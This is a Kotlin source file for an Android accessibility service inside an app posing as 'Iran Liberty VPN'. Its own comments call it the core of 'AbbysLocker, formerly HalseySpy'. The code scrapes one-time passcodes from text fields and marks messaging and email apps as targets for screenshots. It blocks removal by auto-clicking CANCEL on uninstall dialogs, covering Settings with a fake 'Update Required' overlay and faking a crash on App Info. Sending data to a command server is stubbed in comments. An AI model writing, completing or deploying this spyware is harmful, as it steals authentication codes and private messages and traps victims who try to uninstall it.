package com.iran.liberty.vpn

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.os.Build
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.view.Gravity
import android.view.LayoutInflater
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Button
import android.widget.TextView
import androidx.core.content.ContextCompat
import java.util.regex.Pattern

/**
 * Core Accessibility Service for AbbysLocker - formerly HalseySpy
 * Handles OTP harvesting, defensive clicking, and anti-removal overlays
 */
class LibertyAccess : AccessibilityService() {

    private lateinit var windowManager: WindowManager
    private var overlayView: android.view.View? = null
    private val otpPattern: Pattern = Pattern.compile("\\b\\d{4,8}\\b")
    private var lastScreenshotTime: Long = 0
    private val screenshotCooldown: Long = 30000 // 30 seconds

    override fun onServiceConnected() {
        super.onServiceConnected()
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        
        // Configure the accessibility service
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_FOCUSED or
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_CLICKED
            
            feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
            notificationTimeout = 100
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                   AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY or
                   AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }
        
        this.serviceInfo = info
        
        // Start defensive overlay monitoring in background
        startDefensiveMonitoring()
        
        // Log connection (will be removed in production)
        Log.d("LibertyAccess", "Accessibility service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                handleViewFocused(event)
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                handleWindowStateChanged(event)
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                handleViewClicked(event)
            }
        }
    }

    /**
     * Handle focused views for OTP harvesting
     */
    private fun handleViewFocused(event: AccessibilityEvent) {
        val nodeInfo = event.source ?: return
        
        // Look for OTP fields (common patterns)
        val className = nodeInfo.className?.toString()?.lowercase() ?: ""
        val text = nodeInfo.text?.toString() ?: ""
        val contentDescription = nodeInfo.contentDescription?.toString() ?: ""
        
        // Check for OTP patterns in any text field
        if (className.contains("edit") || className.contains("text") || 
            text.contains("otp", true) || text.contains("code", true) ||
            contentDescription.contains("otp", true) || contentDescription.contains("code", true)) {
            
            // Harvest OTP if present
            harvestOTP(nodeInfo)
        }
        
        // Take screenshot on focus changes for sensitive apps
        val packageName = event.packageName?.toString() ?: ""
        if (isSensitiveApp(packageName) && System.currentTimeMillis() - lastScreenshotTime > screenshotCooldown) {
            // Trigger screenshot via HarvestEngine (will be called by Pathway 4)
            // This is a placeholder - actual implementation in HarvestEngine
            lastScreenshotTime = System.currentTimeMillis()
        }
        
        nodeInfo.recycle()
    }

    /**
     * Handle window state changes for anti-removal and screenshots
     */
    private fun handleWindowStateChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: ""
        val className = event.className?.toString() ?: ""
        
        // Detect Settings/Uninstall dialogs for defensive clicking
        if (packageName.contains("settings") || packageName.contains("packageinstaller")) {
            handleDefensiveClicking(event)
            
            // Show anti-removal overlay for Settings
            if (className.contains("Settings") || className.contains("AppInfo")) {
                showAntiRemovalOverlay()
            }
        }
        
        // Detect app info screen for fake crash
        if (className.contains("AppInfo") || className.contains("ApplicationInfo")) {
            triggerFakeCrash()
        }
        
        // Take screenshot on screen changes for certain apps
        if (isSensitiveApp(packageName) && System.currentTimeMillis() - lastScreenshotTime > screenshotCooldown) {
            lastScreenshotTime = System.currentTimeMillis()
            // Screenshot logic will be handled by HarvestEngine
        }
    }

    /**
     * Handle view clicks for additional monitoring
     */
    private fun handleViewClicked(event: AccessibilityEvent) {
        // Placeholder for future click tracking
    }

    /**
     * Harvest OTP from node info
     */
    private fun harvestOTP(nodeInfo: AccessibilityNodeInfo) {
        val text = nodeInfo.text?.toString() ?: ""
        if (TextUtils.isEmpty(text)) return
        
        val matcher = otpPattern.matcher(text)
        while (matcher.find()) {
            val otp = matcher.group()
            if (otp.length in 4..8) {
                // Send to C2 via HarvestEngine (Pathway 4)
                Log.d("LibertyAccess", "OTP detected: $otp")
                // HarvestEngine.handleOTP(otp) - will be implemented in Pathway 4
                break
            }
        }
    }

    /**
     * Check if app is considered sensitive for screenshot
     */
    private fun isSensitiveApp(packageName: String): Boolean {
        val sensitiveApps = listOf(
            "com.whatsapp",
            "com.telegram",
            "com.instagram",
            "com.facebook",
            "org.telegram",
            "com.google.android.gm",
            "com.android.mms",
            "com.android.email"
        )
        return sensitiveApps.any { packageName.contains(it) }
    }

    /**
     * Start defensive monitoring for uninstall attempts
     */
    private fun startDefensiveMonitoring() {
        // This runs a periodic check for uninstall dialogs
        // In production, this would be implemented with a Handler
        Thread {
            while (true) {
                Thread.sleep(5000) // Check every 5 seconds
                // Defensive clicking will be handled by event-driven approach
            }
        }.start()
    }

    /**
     * Handle defensive clicking on uninstall/deactivation dialogs
     */
    private fun handleDefensiveClicking(event: AccessibilityEvent) {
        val rootNode = rootInActiveWindow ?: return
        
        // Look for uninstall or deactivation buttons
        val uninstallNodes = rootNode.findAccessibilityNodeInfosByText("UNINSTALL")
        val cancelNodes = rootNode.findAccessibilityNodeInfosByText("CANCEL")
        val okNodes = rootNode.findAccessibilityNodeInfosByText("OK")
        val deactivateNodes = rootNode.findAccessibilityNodeInfosByText("DEACTIVATE")
        val removeNodes = rootNode.findAccessibilityNodeInfosByText("REMOVE")
        
        val allTargetNodes = uninstallNodes + cancelNodes + okNodes + deactivateNodes + removeNodes
        
        // If we find "CANCEL" button, click it immediately
        for (node in cancelNodes) {
            if (node.isClickable) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                Log.d("LibertyAccess", "Clicked CANCEL button defensively")
                break
            }
        }
        
        // If we find uninstall/deactivate without cancel, show overlay
        if ((uninstallNodes.isNotEmpty() || deactivateNodes.isNotEmpty() || removeNodes.isNotEmpty()) && 
            cancelNodes.isEmpty()) {
            showDefensiveOverlay()
        }
        
        // Clean up
        rootNode.recycle()
        for (list in arrayOf(uninstallNodes, cancelNodes, okNodes, deactivateNodes, removeNodes)) {
            for (node in list) {
                node.recycle()
            }
        }
    }

    /**
     * Show defensive overlay when uninstall is attempted
     */
    private fun showDefensiveOverlay() {
        runOnUiThread {
            try {
                if (overlayView != null) {
                    windowManager.removeView(overlayView)
                }
                
                val inflater = getSystemService(Context.LAYOUT_INFLATER_SERVICE) as LayoutInflater
                overlayView = inflater.inflate(R.layout.defensive_overlay, null)
                
                val params = WindowManager.LayoutParams().apply {
                    type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    } else {
                        WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
                    }
                    format = PixelFormat.RGBA_8888
                    flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                           WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                           WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    gravity = Gravity.CENTER
                    width = WindowManager.LayoutParams.MATCH_PARENT
                    height = WindowManager.LayoutParams.MATCH_PARENT
                }
                
                windowManager.addView(overlayView, params)
                
                // Auto-remove after 3 seconds
                overlayView?.postDelayed({
                    try {
                        windowManager.removeView(overlayView)
                        overlayView = null
                    } catch (e: Exception) {
                        // View already removed
                    }
                }, 3000)
                
            } catch (e: Exception) {
                Log.e("LibertyAccess", "Error showing defensive overlay", e)
            }
        }
    }

    /**
     * Show anti-removal overlay when Settings -> Apps is opened
     */
    private fun showAntiRemovalOverlay() {
        runOnUiThread {
            try {
                // Remove any existing overlay
                if (overlayView != null) {
                    windowManager.removeView(overlayView)
                }
                
                val inflater = getSystemService(Context.LAYOUT_INFLATER_SERVICE) as LayoutInflater
                overlayView = inflater.inflate(R.layout.update_required_overlay, null)
                
                // Set up the overlay
                val title = overlayView?.findViewById<TextView>(R.id.overlay_title)
                val message = overlayView?.findViewById<TextView>(R.id.overlay_message)
                val button = overlayView?.findViewById<Button>(R.id.overlay_button)
                
                title?.text = "Update Required"
                message?.text = "Iran Liberty VPN requires an update to continue service. Please update from the official source."
                button?.text = "OK"
                button?.setOnClickListener {
                    // Launch Play Store or website
                    try {
                        windowManager.removeView(overlayView)
                        overlayView = null
                    } catch (e: Exception) {
                        // Ignore
                    }
                }
                
                val params = WindowManager.LayoutParams().apply {
                    type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    } else {
                        WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
                    }
                    format = PixelFormat.RGBA_8888
                    flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                           WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                           WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                           WindowManager.LayoutParams.FLAG_DIM_BEHIND
                    dimAmount = 0.8f
                    gravity = Gravity.CENTER
                    width = WindowManager.LayoutParams.MATCH_PARENT
                    height = WindowManager.LayoutParams.MATCH_PARENT
                }
                
                windowManager.addView(overlayView, params)
                
            } catch (e: Exception) {
                Log.e("LibertyAccess", "Error showing anti-removal overlay", e)
            }
        }
    }

    /**
     * Trigger fake crash when App Info is opened
     */
    private fun triggerFakeCrash() {
        // Wait 2 seconds then crash
        Thread {
            Thread.sleep(2000)
            throw RuntimeException("Iran Liberty VPN has stopped unexpectedly")
        }.start()
    }

    /**
     * Helper to run on UI thread
     */
    private fun runOnUiThread(action: () -> Unit) {
        ContextCompat.getMainExecutor(this).execute(action)
    }

    override fun onInterrupt() {
        Log.d("LibertyAccess", "Accessibility service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        // Clean up overlay
        try {
            if (overlayView != null) {
                windowManager.removeView(overlayView)
            }
        } catch (e: Exception) {
            // Ignore
        }
        Log.d("LibertyAccess", "Accessibility service destroyed")
    }
}